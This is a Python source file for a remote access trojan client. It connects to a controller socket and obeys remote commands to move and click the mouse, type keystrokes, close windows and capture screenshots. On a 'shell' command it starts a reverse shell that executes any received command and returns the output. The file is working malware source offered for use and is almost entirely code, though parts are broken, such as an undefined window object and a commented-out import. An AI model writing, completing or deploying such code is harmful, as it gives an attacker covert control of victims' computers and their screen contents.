#import pyautogui
import time
import socket
from io import BytesIO
import subprocess

HOST='127.0.0.1'
PORT= 4044
server=(HOST, PORT)
s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#connected=False
def Socket():
    s.connect(server)
    connected = True
    return connected

#fw = pyautogui.getActiveWindow()

LOG=["screen",
    "mouse",
    "move",
    "doubleclick",
    "click",
    "rightclick",
    "write",
    "press",
    "hotkey",
    "minimize",
    "maximize",
    "close",
    "alert",
    "scroll",
    "locate",
    "takeshots",
    ]
def doubleClick():
    pyautogui.doubleClick()
def right_click():
    pyautogui.rightclick()
def Click():
    pyautogui.click()
def move_mouse(x,y):
    pyautogui.move(x, y)
def current_mse_pstion():
    current_mse_pstion = pyautogui.position()
    return current_mse_pstion
def screen_Size():
    screen_size = pyautogui.size()
    return screen_size
def warning_box(message):
    pyautogui.alert(message)
def write(strng):
    pyautogui.write(strng)

def press_key(strng):
    pyautogui.press(strng)
def scroll(distance):
    pyautogui.scroll(distance)
def locate_on_screen(string):
    try:
        location = pyautogui.locateOnScreen(string)
    except Exception as e:
        location=e
    return location
#fw=pyautogui.getActiveWindow() ##only for windows
def minimize_window():
    fw.minimize()
def maximize_window():
    fw.maximize()
def close_window():
    fw.close()
def shts():
    shot=pyautogui.screenshot()
    path=BytesIO
    shot.save(path, "png")
    img=path.getvalue()
    return img
def Shell():
    global s
    comd=s.recv(1024)
    comd=comd.decode("utf-8")
    if comd=="exit":
        s.sendall(("[##]~exiting shell now").encode("utf-8"))
        run()
    else:
        shell = subprocess.Popen(args=comd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        stdout, stderr = shell.communicate()
        if len(stdout) < 1:
            s.sendall(("command executed").encode("utf-8"))
        else:
            s.sendall(stdout)
    Shell()

def run():
    try:

        cmd=s.recv(1024)
        cmd=cmd.decode('utf-8')
        if cmd==LOG[0]:
            info=f'[*]~screen_Size{screen_Size()}'
            info=info.encode('utf-8')
            s.sendall(info)
            time.sleep(0.5)
            run()
        elif cmd==LOG[1]:
            info=current_mse_pstion()
            info=str(info).encode('utf-8')
            s.sendall(info)
            time.sleep(0.5)
            run()
        elif cmd == LOG[2]:
            log= "[$]~please enter cordinate x:"
            log= log.encode('utf-8')
            s.sendall(log)
            time.sleep(0.5)
            infox=s.recv(1024).decode("utf-8")
            log = "[$]~please enter cordinate y:"
            log = log.encode('utf-8')
            s.sendall(log)
            time.sleep(0.5)
            infoy = s.recv(1024).decode("utf-8")
            x=int(infox)
            y=int(infoy)
            move_mouse(x, y)
            log=f"[*]~mouse moved to {x},{y}>>"
            log=log.encode("utf-8")
            s.sendall(log)
            time.sleep(0.5)
            run()


        elif cmd==LOG[3]:
            doubleClick()
            log="[*]~mouse has been double clicked>>"
            log = log.encode('utf-8')
            s.sendall(log)
            time.sleep(0.5)
            run()

        elif cmd==LOG[4]:
            Click()
            log = "[*]~mouse has been clicked>>"
            log = log.encode('utf-8')
            s.sendall(log)
            time.sleep(0.5)
            run()

        elif cmd==LOG[5]:
            right_click()
            log = "[*]~mouse has been right clicked>>"
            log=log.encode('utf-8')
            s.sendall(log)
            time.sleep(0.5)
            run()

        elif cmd == LOG[6]:
            log = "[$]~enter string to write>>"
            log=log.encode('utf-8')
            s.sendall(log)
            info=s.recv(1024)
            info=info.decode('utf-8')
            write(info)
            log = "[*]~string written on screen>>"
            log=log.encode("utf-8")
            s.sendall(log)
            time.sleep(0.5)
            run()

        elif cmd==LOG[7]:
            log = "[$]~enter key to press>>"
            log=log.encode('utf-8')
            s.sendall(log)
            info=s.recv(1024)
            info=info.decode('utf-8')
            press_key(info)
            log = f"[*]~{info} pressed>>"
            s.sendall(log.encode("utf-8"))
            time.sleep(0.5)
            run()

        elif cmd==LOG[9]:
            log="[*]~window minimized"
            log=log.encode("utf-8")
            s.sendall(log)
            minimize_window()
            time.sleep(0.5)
            run()

        elif cmd==LOG[10]:
            log = "[*]~window Maximized"
            log=log.encode("utf-8")
            s.sendall(log)
            maximize_window()
            time.sleep(0.5)
            run()

        elif cmd==LOG[11]:
            log = "[*]~window closed"
            log=log.encode("utf-8")
            s.sendall(log)
            close_window()
            time.sleep(0.5)
            run()

        elif cmd==LOG[12]:
            log = "[$]~enter message to display:"
            s.sendall(log.encode("utf-8"))
            time.sleep(0.5)
            info=s.recv(1024)
            info=info.decode('utf-8')
            warning_box(info)
            log="[*]~alert box created>>"
            s.sendall(log.encode("utf-8"))
            time.sleep(0.5)
            run()
        elif cmd==LOG[13]:
            log = "[$]~enter distance to scroll:"
            s.sendall(log.encode("utf-8"))
            time.sleep(0.5)
            info = s.recv(1024)
            info = info.decode('utf-8')
            info=int(info)
            log = f'[*]-page scroll by distance{info}>>'
            s.sendall(log.encode("utf-8"))
            time.sleep(0.5)
            run()
        elif cmd==LOG[14]:
            log = "[$]~enter object to locate:"
            s.sendall(log.encode("utf-8"))
            time.sleep(0.5)
            info = s.recv(1024)
            info = info.decode('utf-8')
            log = locate_on_screen(info)
            log=log.encode('utf-8')
            s.sendall(log)
            time.sleep(0.5)
            run()
        elif cmd==LOG[15]:
            log="[*]~taking screenshot>>"
            log=log.encode("utf-8")
            s.sendall(log)
            time.sleep(1)
            shot = pyautogui.screenshot()
            path = BytesIO()
            img=shot.save(path, "png")
            img = path.getvalue()
            size=str(len(img))
            print(size)
            size=size.encode("utf-8")
            s.sendall(size)
            time.sleep(0.5)
            s.sendall(img)
            time.sleep(0.5)
            run()
        elif cmd== "shell":
            s.sendall(("[####]~reverse shell has been started").encode("utf-8"))
            Shell()
        else:
            s.sendall(("[*??]~command not recognized, try again").encode("utf-8"))
            run()
    except Exception as e:
        log=f"[*??]~Exception>> {e}"
        log = log.encode("utf-8")
        s.sendall(log)
        run()
try:
    connected=Socket()
    if connected:
        print("[##]connected to host server..")
    while connected:
        run()
except Exception as e:
    print("[*??]~an active connection couldnt be established,\n Have you started the Host server?")
    print(e)
